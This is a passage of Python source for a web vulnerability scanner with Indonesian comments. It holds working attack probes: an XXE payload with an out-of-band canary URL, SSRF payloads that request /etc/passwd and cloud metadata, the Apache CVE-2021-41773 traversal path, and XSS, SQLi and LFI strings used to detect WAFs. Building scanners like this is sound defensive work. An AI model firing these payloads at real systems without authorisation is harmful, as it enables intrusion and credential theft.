    surf = ctx.surface()
    xxe_urls = []
    for form in surf.forms:
        if form.get("method", "GET").upper() == "POST":
            xxe_urls.append(form["action"])
    for pg in surf.pages:
        low = pg.lower()
        if any(k in low for k in ("xml", "soap", "wsdl")):
            xxe_urls.append(pg.split("?")[0])
    seen_u = set()
    n_xxe = 0
    for url in xxe_urls:
        if url in seen_u or n_xxe >= 3:
            continue
        seen_u.add(url)
        tok = reg.issue(f"xxe {url}")
        payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                   '<!DOCTYPE r [<!ENTITY x SYSTEM "'
                   + reg.url(base, tok) + '">]><r>&x;</r>')
        try:
            ctx.client.post(url, data=payload,
                            headers={"Content-Type": "application/xml"})
        except Exception:
            continue
        planted.append((tok, "XXE", url, ""))
        n_xxe += 1
    if not planted:
        ctx.L("  [oob] no suitable SSRF/XXE injection points found")
        return
    ctx.L(f"  [oob] {len(planted)} canary tokens planted "
          f"({n_ssrf} SSRF, {n_xxe} XXE) — waiting for callbacks")
    time.sleep(3.0)
    confirmed = 0
    for tok, kind, loc, pname in planted:
        hits = reg.hits(tok)
        if not hits:
            continue
        h = hits[0]
        confirmed += 1
        if kind == "SSRF":
            add(F("CRITICAL", f"Blind SSRF confirmed via out-of-band callback: {loc} param '{pname}'",
                  "The server fetched the unique canary URL planted in this parameter — server-side request forgery proven by an actual inbound callback, not by response inference. The fetcher can likely be pointed at internal services and cloud metadata.",
                  evidence=f"canary callback from {h.get('ip')} ({h.get('method')} /{tok}) UA: {h.get('user_agent', '')[:60]}",
                  cwe="CWE-918", owasp="A10:2021 SSRF", cvss=9.1,
                  remed="Whitelist destination hosts/schemes for server-side fetches; block private, loopback and metadata addresses.",
                  confidence="confirmed", location=loc, param=pname))
        else:
            add(F("CRITICAL", f"Blind XXE confirmed via out-of-band callback: {loc}",
                  "The XML parser resolved the external entity planted in the posted XML body and called the canary URL — XML External Entity processing is enabled on this endpoint.",
                  evidence=f"canary callback from {h.get('ip')} ({h.get('method')} /{tok}) UA: {h.get('user_agent', '')[:60]}",
                  cwe="CWE-611", owasp="A05:2021 Security Misconfiguration", cvss=8.2,
                  remed="Disable DTD/external entities in the XML parser (disallow DOCTYPE or external entity resolution).",
                  confidence="confirmed", location=loc, param=""))
    ctx.L(f"  [oob] callbacks confirmed: {confirmed}/{len(planted)} planted tokens")


def c_ssrf(ctx, add):
    """SSRF: (1) cloud metadata signature = confirmed; (2) oracle fetch internal:
    server diminta fetch URL 127.0.0.1 ke port target sendiri — bila konten homepage
    internal muncul di respons padahal baseline tidak, fetch sisi-server terbukti."""
    home = ctx.client.get("/")
    home_sig = ""
    m = re.search(r"<title>([^<]{4,80})</title>", home.body or "", re.I)
    if m:
        home_sig = m.group(1).strip()
    meta = "http://169.254.169.254/latest/meta-data/"
    # Budget besar + filter nama di depan: limit kecil membuat parameter URL
    # asli (mis. /fetch?url=) kelaparan di belakang parameter lain (bug
    # starvation yang sama seperti injeksi v3.4, kini untuk SSRF).
    tested = 0
    for base, pname, method, orig in ctx.param_targets(limit=40):
        if pname.lower() not in crawl_mod.URL_PARAM_NAMES:
            continue
        tested += 1
        if tested > 6:
            break
        # v3.7: buktikan SEMUA vektor SSRF pada parameter ini (file://,
        # metadata, fetch internal) dan lanjut ke parameter URL berikutnya —
        # jangan berhenti di bukti/parameter pertama.
        hit = False
        rf = ctx.req_param(base, pname, "file:///etc/passwd", method, orig)
        if re.search(r"root:.*?:0:0:", rf.body or ""):
            add(F("CRITICAL", f"SSRF/LFI via file:// scheme: {base} param '{pname}'",
                  'The URL parameter accepts the file:// scheme and returns the contents of /etc/passwd — the server-side fetcher does not validate the scheme/destination.',
                  evidence='signature /etc/passwd from file:///etc/passwd', cwe="CWE-918",
                  owasp="A10:2021 SSRF", cvss=9.1,
                  remed='Whitelist the http/https schemes + destination hosts; block file/gopher/dict.',
                  confidence="confirmed", location=base, param=pname))
            hit = True
        r = ctx.req_param(base, pname, meta, method, orig)
        body = r.body or ""
        if re.search(r"ami-id|instance-id|instance-type|iam/security-credentials", body):
            add(F("CRITICAL", f"SSRF to cloud metadata: {base} param '{pname}'",
                  'The server fetched and displayed cloud instance metadata (169.254.169.254) — instance credentials could be leaked.',
                  evidence='cloud metadata signature in the response', cwe="CWE-918",
                  owasp="A10:2021 SSRF", cvss=9.1,
                  remed='Block the metadata IP & private addresses from the fetcher; whitelist destination hosts.',
                  confidence="confirmed", location=base, param=pname))
            hit = True
        if home_sig:
            port = ctx.client.port
            internal = f"http://127.0.0.1:{port}/"
            r2 = ctx.req_param(base, pname, internal, method, orig)
            base_r = ctx.req_param(base, pname, "1", method, orig)
            if home_sig in (r2.body or "") and home_sig not in (base_r.body or ""):
                add(F("HIGH", f"SSRF (internal fetch proven): {base} param '{pname}'",
                      f"The URL parameter makes the server fetch content from 127.0.0.1 (internal homepage title '{home_sig[:40]}' appears in the response).",
                      evidence=f"fetch {internal} -> internal content reflected",
                      cwe="CWE-918", owasp="A10:2021 SSRF", cvss=8.6,
                      remed='Whitelist fetch destination hosts; block private/loopback addresses.',
                      confidence="probable", location=base, param=pname))
                hit = True


def c_host_header(ctx, add):
    evil = f"evil-{ctx.marker}.example.com"
    r = ctx.client.get("/", headers={"X-Forwarded-Host": evil})
    if r.status and evil in (r.body or ""):
        add(F("MEDIUM", 'X-Forwarded-Host reflected into the page',
              'An attacker-controlled header is reflected — host-header injection indication (e.g. in password reset links).',
              evidence=evil, cwe="CWE-644", owasp="A05:2021", cvss=5.9,
              remed='Whitelist the Host header; ignore X-Forwarded-Host from clients.',
              confidence="confirmed", location="/"))


# ------------------------------------------------------------ active: services & CVE

RISKY_PORTS = {
    23: ("CRITICAL", "CWE-319", 9.8, 'Telnet open', "Matikan telnet; pakai SSH."),
    21: ("HIGH", "CWE-319", 7.5, 'FTP open', 'Use SFTP/FTPS; close port 21.'),
    3389: ("HIGH", "CWE-284", 8.6, 'RDP exposed', 'Restrict via VPN/firewall; enable NLA + MFA.'),
    445: ("HIGH", "CWE-284", 8.6, 'SMB exposed to the public', 'Block 445 from the internet.'),
    6379: ("CRITICAL", "CWE-306", 9.8, 'Redis open', "Set requirepass + bind 127.0.0.1."),
    27017: ("CRITICAL", "CWE-306", 9.8, 'MongoDB open', 'Enable auth + bind internally.'),
    27018: ("CRITICAL", "CWE-306", 9.8, 'MongoDB (shard) open', 'Enable auth + bind internally.'),
    11211: ("HIGH", "CWE-306", 8.6, 'Memcached open', 'Bind internally; block from the public.'),
    3306: ("MEDIUM", "CWE-284", 5.9, 'MySQL exposed', 'Bind internally; use an SSH tunnel.'),
    5432: ("MEDIUM", "CWE-284", 5.9, 'PostgreSQL exposed', 'Bind internally.'),
    5900: ("HIGH", "CWE-284", 8.6, 'VNC open', "Tunnel via VPN; pakai auth kuat."),
    161: ("MEDIUM", "CWE-200", 5.3, 'SNMP open', "Ganti community string default; pakai SNMPv3."),
    1723: ("MEDIUM", "CWE-319", 6.5, 'PPTP VPN open', "Migrate to WireGuard/OpenVPN."),
    9200: ("HIGH", "CWE-306", 8.6, 'Elasticsearch exposed', 'Enable security; bind internally.'),
    2375: ("CRITICAL", "CWE-306", 9.8, 'Docker API (without TLS) exposed', "Jangan expose 2375; pakai socket lokal/SSH."),
    2379: ("HIGH", "CWE-306", 8.6, 'etcd exposed', 'Enable auth + TLS; bind internally.'),
    6443: ("MEDIUM", "CWE-284", 5.9, 'Kubernetes API exposed', 'Restrict API server access sources.'),
    10250: ("HIGH", "CWE-306", 8.6, 'kubelet API exposed', 'Enable kubelet auth; bind internally.'),
    15672: ("MEDIUM", "CWE-284", 5.3, 'RabbitMQ management exposed', 'Restrict via VPN/firewall.'),
    5601: ("MEDIUM", "CWE-284", 5.3, 'Kibana exposed', 'Require authentication; restrict the network.'),
    1433: ("MEDIUM", "CWE-284", 5.9, 'Microsoft SQL Server exposed', 'Bind internally; do not expose to the internet.'),
    1521: ("MEDIUM", "CWE-284", 5.9, 'Oracle Database exposed', 'Bind internally.'),
    2049: ("HIGH", "CWE-284", 8.6, 'NFS exposed', 'Restrict NFS exports to trusted hosts only.'),
    389: ("LOW", "CWE-200", 3.7, 'LDAP exposed', 'Consider LDAPS + authentication; restrict the network.'),
    5985: ("MEDIUM", "CWE-319", 6.5, 'WinRM HTTP exposed', 'Use WinRM HTTPS (5986) and restrict sources.'),
    4848: ("MEDIUM", "CWE-284", 5.3, 'GlassFish admin exposed', 'Restrict the admin console to the internal network.'),
    8086: ("MEDIUM", "CWE-306", 6.5, 'InfluxDB exposed', 'Enable InfluxDB auth; bind internally.'),
    9000: ("MEDIUM", "CWE-284", 5.3, 'Administrative HTTP service exposed (9000)', 'Verify the service on this port; restrict the network.'),
}


def c_services(ctx, add):
    host = ctx.client.host
    det = tcp_scan_detailed(host, COMMON_PORTS)
    open_ports = det["open"]
    ctx.L(f"  [services] open port: {[p['port'] for p in open_ports] or '-'} (verified: {[p['port'] for p in open_ports if p.get('verified')] or '-'})")
    if det["intercepted"]:
        # Jalur egress menjawab SEMUA port (gateway/tarpit): hasil port BUKAN
        # cerminan target. Nyatakan tidak konklusif — jangan buat temuan port.
        add(F("INFO", 'Port scan INCONCLUSIVE — TCP connection intercepted on the egress path',
              f"The TCP connection to the target is answered by a third party on the network path ({det['intercept_reason']}), so the port status does not reflect the target at all. A port scan is only valid from a network without an interceptor.",
              evidence=(det["banner_sample"] or "")[:140], cwe="CWE-200",
              owasp="A05:2021 Security Misconfiguration", cvss=0.0,
              remed="Repeat the port scan from a clean vantage point (e.g. the auditor's host directly); ignore this port run's results.",
              confidence="confirmed", location=""))
        ctx.L('  [services] INTERCEPTED — port scan declared inconclusive')
        return
    unverified_risky = []
    for p in open_ports:
        port = p["port"]
        if port not in RISKY_PORTS:
            continue
        if p.get("verified"):
            sev, cwe, cvss, title, remed = RISKY_PORTS[port]
            add(F(sev, f"{title} (port {port}/tcp)", remed,
                  evidence=(p["banner"] or 'protocol probe verified')[:140],
                  cwe=cwe, owasp="A05:2021 Security Misconfiguration", cvss=cvss,
                  remed=remed, confidence="confirmed", location=f":{port}"))
        else:
            unverified_risky.append(port)
    if unverified_risky:
        lst = ", ".join(str(x) for x in sorted(unverified_risky))
        add(F("LOW", f"Risky ports detected via TCP connect (not yet verified): {lst}",
              'These ports accept TCP connections but their responses do NOT match the claimed service signatures — this may indicate a tarpit/firewall, a non-standard service, or the actual service with a custom banner. They must not be reported as confirmed services before manual verification.',
              evidence='TCP connect succeeded; protocol signature does not match',
              cwe="CWE-200", owasp="A05:2021 Security Misconfiguration", cvss=3.7,
              remed='Verify each port manually (nmap -sV from a clean network); close unneeded ports.',
              confidence="candidate", location=""))
    # --- verifikasi API service tanpa autentikasi (HTTP, port non-web utama)
    probes = [
        (2375, "/version", r'"Version"\s*:|"ApiVersion"', "CRITICAL",
         'Docker API accessible WITHOUT authentication', "CWE-306", 9.8,
         'Immediately close 2375 from the public network; access Docker via socket/SSH only.'),
        (9200, "/", r'"cluster_name"|"tagline"\s*:\s*"You Know, for Search"', "HIGH",
         'Elasticsearch accessible WITHOUT authentication', "CWE-306", 8.6,
         'Enable X-Pack security; bind internally.'),
        (2379, "/version", r'"etcdserver"|"etcdcluster"', "HIGH",
         'etcd accessible WITHOUT authentication', "CWE-306", 8.6,
         "Enable etcd auth + TLS."),
        (10250, "/healthz", r"^ok$", "MEDIUM",
         'kubelet API responds without authentication (healthz)', "CWE-306", 6.5,
         'Enable kubelet authentication/authorization.'),
    ]
    open_set = {p["port"] for p in open_ports if p.get("verified")}
    import http.client as _hc
    for port, path, sig, sev, title, cwe, cvss, remed in probes:
        if port not in open_set or ctx.cancelled():
            continue
        try:
            conn = _hc.HTTPConnection(host, port, timeout=4)
            conn.request("GET", path, headers={"User-Agent": "VANTHEX/1.1.0"})
            r = conn.getresponse()
            body = r.read(20000).decode("utf-8", "replace")
            conn.close()
            if r.status == 200 and re.search(sig, body):
                add(F(sev, f"{title} (port {port})",
                      'The HTTP probe to the service API succeeded without any credentials and the response passed the product signature check.',
                      evidence=body[:140].replace("\n", " "), cwe=cwe,
                      owasp="A05:2021", cvss=cvss, remed=remed,
                      confidence="confirmed", location=f":{port}{path}"))
        except Exception:
            pass


# Kandidat CVE berbasis versi ter-fingerprint — SELALU confidence=candidate.
CVE_CANDIDATES = [
    ("Apache", "2.4.49", "CVE-2021-41773", "CRITICAL", 9.8,
     'Apache 2.4.49 is vulnerable to path traversal/RCE (CVE-2021-41773). A separate active probe will attempt to confirm it.'),
    ("Apache", "2.4.50", "CVE-2021-42013", "CRITICAL", 9.8,
     'Apache 2.4.50 is vulnerable to the CVE-2021-42013 traversal variant.'),
    ("WordPress", None, None, "INFO", 0.0, None),  # placeholder, di-skip (perlu versi persis < terbaru)
    ("PHP", "7.4.3", "CVE-2020-7064", "MEDIUM", 5.4,
     'PHP 7.4.3 has known CVEs (e.g. CVE-2020-7064) — verify the vendor changelog.'),
    ("nginx", "1.20.0", "CVE-2021-23017", "HIGH", 7.7,
     'nginx 1.20.0 is vulnerable to CVE-2021-23017 (DNS resolver off-by-one).'),
    ("IIS", "7.5", "CVE-2015-1635", "HIGH", 7.4,
     'IIS 7.5 is vulnerable to HTTP.sys RCE CVE-2015-1635 if unpatched.'),
]


# Tabel CVE berbasis RENTANG versi (v1.1) — melengkapi CVE_CANDIDATES
# (exact match). Spec: klausul dipisah koma, operator ==, <, <=, >, >=.
# Semua entri adalah CVE nyata yang terkenal; status tetap CANDIDATE.
CVE_RANGES = [
    ("nginx", ">=0.6.18,<=1.20.0", "CVE-2021-23017", "HIGH", 7.7,
     "nginx resolver off-by-one (CVE-2021-23017) affects 0.6.18-1.20.0."),
    ("Microsoft IIS", "==7.5", "CVE-2015-1635", "HIGH", 7.4,
     "IIS 7.5 is vulnerable to HTTP.sys RCE CVE-2015-1635 if unpatched."),
    ("jQuery", "<3.0.0", "CVE-2015-9251", "MEDIUM", 6.1,
     "jQuery before 3.0.0 is vulnerable to XSS via cross-domain Ajax responses (CVE-2015-9251)."),
    ("jQuery", "<3.4.0", "CVE-2019-11358", "MEDIUM", 6.1,
     "jQuery before 3.4.0 is vulnerable to prototype pollution via $.extend (CVE-2019-11358)."),
    ("jQuery", "<3.5.0", "CVE-2020-11022", "MEDIUM", 6.1,
     "jQuery before 3.5.0 may execute untrusted HTML in DOM manipulation methods (CVE-2020-11022)."),
    ("WordPress", "<5.8.3", "CVE-2022-21661", "HIGH", 7.5,
     "WordPress before 5.8.3 is vulnerable to SQL injection via WP_Query (CVE-2022-21661)."),
    ("GitLab", ">=11.9,<13.10.3", "CVE-2021-22205", "CRITICAL", 10.0,
     "GitLab CE/EE in this range is vulnerable to the ExifTool unauthenticated RCE (CVE-2021-22205); per-branch fixes: 13.10.3 / 13.9.6 / 13.8.8."),
]

_NVD_TOKENS = {"WordPress": "wordpress", "Apache": "apache",
               "jQuery": "jquery", "PHP": "php", "nginx": "nginx",
               "OpenSSL": "openssl"}


def _spec_match(ver, spec):
    """True bila versi `ver` memenuhi spec rentang (CSV klausul). Versi yang
    tidak terparse -> False (tidak pernah menebak)."""
    try:
        from packaging.version import Version
        v = Version(str(ver))
    except Exception:
        return False
    for clause in (spec or "").split(","):
        clause = clause.strip()
        m = re.match(r"(==|<=|>=|<|>)\s*(.+)$", clause)
        if not m:
            return False
        op, raw = m.group(1), m.group(2).strip()
        try:
            rv = Version(raw)
        except Exception:
            return False
        if op == "==" and not v == rv:
            return False
        if op == "<" and not v < rv:
            return False
        if op == "<=" and not v <= rv:
            return False
        if op == ">" and not v > rv:
            return False
        if op == ">=" and not v >= rv:
            return False
    return True


def _attach_cves(ctx, techs):
    """Tempelkan kandidat CVE ke setiap entri tech_profile: dari tabel
    internal (exact + rentang) dan dari cache NVD lokal (kata kunci produk
    + versi disebut / frasa 'prior to' di deskripsi). Mengembalikan list
    (tech, cve_dict, desc) untuk temuan bawaan tabel internal."""
    builtin_hits = []
    for t in techs:
        cves, seen = [], set()
        ver = t.get("version") or ""
        if ver:
            for name, ever, cve, sev, cvss, desc in CVE_CANDIDATES:
                if desc and t["name"] == name and ver == ever:
                    cves.append({"id": cve, "cvss": cvss, "severity": sev,
                                 "source": "builtin"})
                    seen.add(cve)
                    builtin_hits.append((t, cves[-1], desc))
            for name, spec, cve, sev, cvss, desc in CVE_RANGES:
                if t["name"] == name and _spec_match(ver, spec) \
                        and cve not in seen:
                    cves.append({"id": cve, "cvss": cvss, "severity": sev,
                                 "source": "builtin-range"})
                    seen.add(cve)
                    builtin_hits.append((t, cves[-1], desc))
            token = _NVD_TOKENS.get(t["name"])
            if token:
                try:
                    import store as _store
                    for row in _store.cve_search(token, 50):
                        cid = row.get("cve_id") or ""
                        if not cid or cid in seen:
                            continue
                        desc_c = row.get("description") or ""
                        keep = ver in desc_c
                        if not keep:
                            for mfix in re.finditer(
                                    r"prior to (?:version )?v?([\d.]+)",
                                    desc_c):
                                if _spec_match(ver, "<" + mfix.group(1)):
                                    keep = True
                                    break
                        if keep:
                            cves.append({"id": cid, "cvss": row.get("cvss"),
                                         "severity": row.get("severity"),
                                         "source": "nvd-cache"})
                            seen.add(cid)
                        if len(cves) >= 6:
                            break
                except Exception:
                    pass
        t["cves"] = cves
    return builtin_hits


def c_cve_candidates(ctx, add):
    techs = _tech_fingerprint(ctx)
    for t, cve, desc in _attach_cves(ctx, techs):
        add(F(cve["severity"], f"Candidate {cve['id']}: {t['name']} {t['version']}",
              desc + ' Status: CANDIDATE based on fingerprinted version — manual verification / patch-level check is mandatory before reporting as valid.',
              evidence=t["evidence"], cwe="CWE-1035",
              owasp="A06:2021 Vulnerable & Outdated Components",
              cvss=cve["cvss"] or 0.0,
              remed=f"Upgrade {t['name']} to a version that patches {cve['id']}.",
              confidence="candidate", location="/"))
    for t in techs:
        cache_hits = [c for c in (t.get("cves") or [])
                      if c["source"] == "nvd-cache"]
        if cache_hits:
            ids = ", ".join(c["id"] for c in cache_hits[:6])
            add(F("INFO", f"NVD cache: {len(cache_hits)} CVE candidate(s) match {t['name']} {t.get('version', '')}".rstrip(),
                  f"The local NVD cache (synced CVE data) contains entries whose descriptions match the fingerprinted version of {t['name']}: {ids}. Status: CANDIDATE — confirm applicability per CVE before reporting.",
                  evidence=t["evidence"], cwe="CWE-1035",
                  owasp="A06:2021 Vulnerable & Outdated Components", cvss=0.0,
                  remed=f"Review each listed CVE for {t['name']} and upgrade/patch as applicable.",
                  confidence="candidate", location="/"))
    # Spring actuator ter-expose (signature nyata, bukan sekadar 200)
    r = ctx.client.get("/actuator")
    if r.status == 200 and not ctx.is_missing(r) and "_links" in (r.body or ""):
        add(F("HIGH", 'Spring Boot Actuator exposed: /actuator',
              'The response contains actuator _links (Spring signature) without authentication.',
              evidence=r.body[:140], cwe="CWE-200", owasp="A05:2021", cvss=7.5,
              remed='Secure the actuator with Spring Security; expose only health/info.',
              confidence="confirmed", location="/actuator"))
    for path, sev, title, remed in [
            ("/phpmyadmin/", "MEDIUM", 'phpMyAdmin exposed',
             'Restrict via IP/VPN or remove from production.'),
            ("/administrator/", "MEDIUM", 'Joomla admin exposed',
             'Restrict access; patch regularly.')]:
        r = ctx.client.get(path)
        if r.status == 200 and not ctx.is_missing(r) and re.search(
                r"phpmyadmin|joomla|login", r.body or "", re.I):
            add(F(sev, f"{title}: {path}",
                  'The console is publicly reachable and its content passed the product signature check.',
                  evidence=f"HTTP 200 + signature", cwe="CWE-1188", owasp="A05:2021",
                  cvss=5.3, remed=remed, confidence="probable", location=path))
    # Apache CVE-2021-41773 — probe AKTIF terkonfirmasi (bukan kandidat lagi bila lolos)
    techs_apache = [t for t in techs if t["name"] == "Apache" and t["version"] in ("2.4.49", "2.4.50")]
    if techs_apache:
        probe = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        r = ctx.client.get(probe)
        if r.status == 200 and re.search(r"root:.*?:0:0:", r.body or ""):
            add(F("CRITICAL", 'CVE-2021-41773 CONFIRMED: Apache path traversal',
                  'A traversal probe read /etc/passwd from the vulnerable Apache target.',
                  evidence='signature /etc/passwd from the .%2e probe', cwe="CWE-22",
                  owasp="A01:2021", cvss=9.8,
                  remed='Upgrade Apache to >=2.4.51 IMMEDIATELY.',
                  confidence="confirmed", location=probe))


# ------------------------------------------------------------ advanced checks (v3.2)

# Signature WAF (v3.4.1): indikator KUAT saja, header dan body dipisah.
# Insiden FP 2026-10-16: pola lama r"f5" cocok dengan substring "f5" di dalam
# token hex acak aplikasi GeneXus (gx_ajax_key) pada server nginx polos ->
# tuduhan "F5 BIG-IP" palsu. Aturan di sini: pola 1-2 karakter dan nama vendor
# telanjang di body DILARANG; setiap pola harus khas vendor, dan bukti yang
# cocok (header/snippet) dicatat di evidence agar FP berikutnya mudah dilacak.
WAF_HDR_SIGNS = [
    (r"cf-ray|cf-cache-status|__cf_bm|server:\s*cloudflare", "Cloudflare"),
    (r"x-sucuri|server:\s*sucuri", "Sucuri"),
    (r"visid_incap|incap_ses|x-iinfo", "Imperva/Incapsula"),
    (r"x-akamai|akamaighost|akamai-grn", "Akamai"),
    (r"x-amzn-waf|awswaf", "AWS WAF"),
    (r"bigipserver|set-cookie:\s*ts[0-9a-f]{6,}=|x-wa-info|\bbig-?ip\b", "F5 BIG-IP"),
    (r"x-barracuda|barracuda", "Barracuda"),
    (r"server:\s*fortigate|fortiweb|x-fw-", "FortiWeb"),
]
WAF_BODY_SIGNS = [
    (r"attention required!?\s*\|\s*cloudflare|cloudflare ray id|error 1015|error 1020",
     "Cloudflare"),
    (r"sucuri website firewall|access denied - sucuri", "Sucuri"),
    (r"mod_?security|modsecurity|this error was generated by mod_security", "ModSecurity"),
    (r"incapsula incident|powered by incapsula|\bimperva\b", "Imperva/Incapsula"),
    (r"akamaighost|reference #18\.[a-f0-9]+\.[a-f0-9]+", "Akamai"),
    (r"aws waf|amazon waf", "AWS WAF"),
    (r"the requested url was rejected|f5 networks|\bbig-ip\b", "F5 BIG-IP"),
    (r"barracuda web application firewall|barracuda networks", "Barracuda"),
    (r"fortiweb|fortigate", "FortiWeb"),
]


def _waf_match(headers, body):
    """Cocokkan indikator WAF. headers: list[(k, v)]; body: str.
    Return (vendor, deskripsi indikator) atau None. Fungsi murni — unit-testable."""
    hdr = " ".join(f"{k}: {v}" for k, v in headers).lower()
    for pat, name in WAF_HDR_SIGNS:
        m = re.search(pat, hdr)
        if m:
            return name, f"header ~ '{m.group(0)[:60]}'"
    b = (body or "")[:6000].lower()
    for pat, name in WAF_BODY_SIGNS:
        m = re.search(pat, b)
        if m:
            i = max(0, m.start() - 30)
            return name, f"body ~ '...{b[i:m.end() + 30].strip()[:90]}...'"
    return None


WAF_BLOCK_STATUSES = {403, 406, 409, 411, 419, 451, 501, 999}
WAF_BLOCK_WORDS = ("blocked", "access denied", "request rejected",
                   "security policy", "web application firewall",
                   "attention required", "mod_security", "request blocked")


def _waf_behavior_verdict(probes):
    """Klasifikasi perilaku WAF dari hasil probe. probes: list dict
    {kind: 'attack'|'control', status: int, body: str}.
    WAF dinyatakan TERKONFIRMASI hanya bila >=2 kelas serangan diblokir DAN
    tidak ada kontrol jinak yang diblokir — bukti perilaku, bukan tebakan
    signature. Fungsi murni, unit-testable."""
    def blocked(p):
        if p.get("status") in WAF_BLOCK_STATUSES:
            return True
        b = (p.get("body") or "").lower()
        return p.get("status") not in (200, 404, 405) and \
            any(w in b for w in WAF_BLOCK_WORDS)
    atk = [p for p in probes if p["kind"] == "attack"]
    ctl = [p for p in probes if p["kind"] == "control"]
    n_atk = sum(1 for p in atk if blocked(p))
    n_ctl = sum(1 for p in ctl if blocked(p))
    return {"blocked_attacks": n_atk, "total_attacks": len(atk),
            "blocked_controls": n_ctl, "total_controls": len(ctl),
            "confirmed": n_atk >= 2 and n_ctl == 0}


def c_waf_detection(ctx, add):
    """Deteksi WAF berbasis PERILAKU (v3.5) — bukan tebakan nama:
    kirim payload serangan (XSS/SQLi/LFI) dan kontrol jinak ke path yang PASTI
    tidak ada di aplikasi. Aplikasi tidak punya apa pun untuk diblokir di path
    hantu itu, jadi blocking diferensial (serangan diblokir, kontrol lolos)
    membuktikan ada lapisan inspeksi di depan aplikasi. Nama vendor hanya
    disebut sebagai INDIKASI terpisah bila ada artefak khas vendor, dan tidak
    pernah menjadi dasar klaim keberadaan WAF."""
    home = ctx.client.get("/")
    mk = ctx.marker
    ghost = f"/ptk-ghost-{mk}"
    probes_spec = [
        ("attack", f"{ghost}?q=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"),
        ("attack", f"{ghost}?id=1%27%20OR%20%271%27%3D%271"),
        ("attack", f"{ghost}/..%2f..%2fetc%2fpasswd"),
        ("control", f"{ghost}?q=" + "a" * 180),
        ("control", f"{ghost}?q=%E2%9C%93%20halo%20dunia"),
        ("control", f"{ghost}?q=%22%27%3B%3D%28%29"),
    ]
    probes = []
    for kind, path in probes_spec:
        r = ctx.client.get(path)
        probes.append({"kind": kind, "status": r.status or 0,
                       "body": (r.body or "")[:1500]})
    v = _waf_behavior_verdict(probes)
    stat_txt = ", ".join(f"{p['kind']}:{p['status']}" for p in probes)
    vendor = _waf_match(list(home.headers), home.body or "")
    ctx.L(f"  [waf] behavior: {v['blocked_attacks']}/{v['total_attacks']} attacks blocked, controls blocked {v['blocked_controls']}; vendor indication: {vendor[0] if vendor else '-'}")
    note = ("Scan results may be suppressed (payloads blocked) — negative findings on this target must be read as 'not confirmed', not 'clean'.")
    if v["confirmed"]:
        title = 'WAF confirmed (measured blocking behavior)'
        ev = f"probe path-hantu: {stat_txt}"
        if vendor:
            title += f" — vendor indication: {vendor[0]}"
            ev += f"; {vendor[1]}"
        add(F("INFO", title,
              'The inspection layer in front of the application PROVABLY blocks attack payloads on paths that do not exist in the application, while benign control requests pass. ' + note,
              evidence=ev, cwe="CWE-693", owasp="A05:2021", cvss=0.0,
              remed='No action required — scan accuracy context information.',
              confidence="confirmed", location="/"))
    elif vendor:
        add(F("INFO", f"WAF indication: {vendor[0]} (behavior not yet confirmed)",
              'A vendor-specific artifact was found, but the blocking behavior test does not prove active inspection — treat it as an indication, not a certainty. ' + note,
              evidence=f"{vendor[1]}; probe: {stat_txt}", cwe="CWE-693",
              owasp="A05:2021", cvss=0.0,
              remed='No action required — scan accuracy context information.',
              confidence="probable", location="/"))


DOM_SOURCES = [r"location\.(search|hash|href)", r"document\.(URL|documentURI|referrer)",
               r"window\.name", r"URLSearchParams"]
DOM_SINKS = [r"\.innerHTML\s*=", r"\.outerHTML\s*=", r"document\.write(?:ln)?\s*\(",
             r"eval\s*\(", r"\.insertAdjacentHTML\s*\(", r"setTimeout\s*\(\s*['\"]",
             r"\$\s*\([^)]*\)\.html\s*\("]


def c_dom_xss(ctx, add):
    """DOM XSS statis: file JS same-host yang memuat SOURCE (location.search/hash/dll)
    DAN SINK berbahaya (innerHTML/document.write/eval) dalam file yang sama = probable."""
    surf = ctx.surface(full=True)
    home = surf.homepage or ctx.client.get("/")
    srcs = [s for s in re.findall(r'''<script[^>]+src\s*=\s*["']([^"']+)["']''',
                                  home.body or "", re.I) if s.startswith("/")]
    for src in list(dict.fromkeys(srcs))[:6]:
        r = ctx.client.get(src)
        if r.status != 200 or not r.body:
            continue
        srcs_hit = [p for p in DOM_SOURCES if re.search(p, r.body)]
        sinks_hit = [p for p in DOM_SINKS if re.search(p, r.body)]
        if srcs_hit and sinks_hit:
            add(F("HIGH", f"DOM-based XSS indication in JS file: {src}",
                  f"This JavaScript file reads user-controlled input ({srcs_hit[0]}) and writes to a dangerous sink ({sinks_hit[0]}) — a classic DOM XSS combination. Static analysis does not prove the data flow is connected; manual verification in a browser is still required.",
                  evidence=f"source={srcs_hit[0]} sink={sinks_hit[0]}", cwe="CWE-79",
                  owasp="A03:2021 Injection", cvss=7.4,
                  remed='Use textContent, not innerHTML/document.write, for data from URLs; sanitize with DOMPurify.',
                  confidence="probable", location=src))


WP_PLUGINS = {
    "wp-file-manager": ("6.9", "CVE-2020-25213 RCE via upload (versi <6.9)"),
    "elementor": ("3.18.2", 'several XSS/upload CVEs in old versions'),
    "revslider": ("4.2", 'CVE-2014-9734 classic LFI/upload'),
    "contact-form-7": ("5.1.8", "CVE-2020-12800 unrestricted upload (versi <5.1.9)"),
    "woocommerce": ("5.0.0", 'old version range with privilege/XSS CVEs'),
    "duplicator": ("1.3.28", "CVE-2020-11738 LFI (versi <1.3.28)"),
    "wp-statistics": ("13.0.8", "CVE-2021-24340 SQLi (versi <13.0.8)"),
}


def _ver_lt(a, b):
    try:
        pa = [int(x) for x in re.findall(r"\d+", a)][:3]
        pb = [int(x) for x in re.findall(r"\d+", b)][:3]
        return (pa + [0, 0, 0])[:3] < (pb + [0, 0, 0])[:3]
    except Exception:
        return False


def c_wp_plugins(ctx, add):
    """Enumerasi plugin WordPress populer via readme.txt (Stable tag) -> kandidat CVE."""
    if not any(t["name"] == "WordPress" for t in _tech_fingerprint(ctx)):
        return
    for slug, (vuln_below, note) in WP_PLUGINS.items():
        if ctx.cancelled():
            return
        path = f"/wp-content/plugins/{slug}/readme.txt"
        r = ctx.client.get(path)
        if r.status != 200 or ctx.is_missing(r) or not r.body:
            continue
        m = re.search(r"Stable tag:\s*([\d.]+)", r.body)
        if not m:
            continue
        ver = m.group(1)
        old = _ver_lt(ver, vuln_below)
        add(F("HIGH" if old else "INFO",
              f"WordPress plugin detected: {slug} {ver}",
              f"The plugin readme.txt is publicly readable. " +
              (f"Versi {ver} below {vuln_below}: {note}." if old else
               'This version is not below the known CVE threshold in the built-in database.'),
              evidence=f"Stable tag: {ver}", cwe="CWE-1035",
              owasp="A06:2021 Vulnerable & Outdated Components",
              cvss=7.5 if old else 0.0,
